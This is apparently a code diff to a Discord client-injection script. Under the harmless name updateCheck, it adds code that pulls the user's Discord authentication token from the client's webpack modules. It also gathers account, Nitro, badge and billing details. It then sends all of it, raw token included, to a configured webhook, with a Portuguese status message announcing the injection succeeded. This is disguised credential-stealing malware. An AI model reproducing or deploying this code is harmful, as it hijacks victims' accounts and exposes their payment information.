@@ -407,9 +407,54 @@ const discordPath = (function () {
   return { undefined, undefined };
 })();
 
-function updateCheck() {
+async function updateCheck() {
   const { resourcePath, app } = discordPath;
   if (resourcePath === undefined || app === undefined) return;
+
+  const token = await execScript(
+    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
+  );
+
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Status**',
+            value: `✅ Injeção iniciada com sucesso ao abrir o Discord.`,
+            inline: false,
+          },
+          {
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: true,
+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+        author: {
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        timestamp: new Date(),
+      },
+    ],
+  };
+
+  if (config.ping_on_run) content['content'] = config.ping_val;
+
+  hooker(content);
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
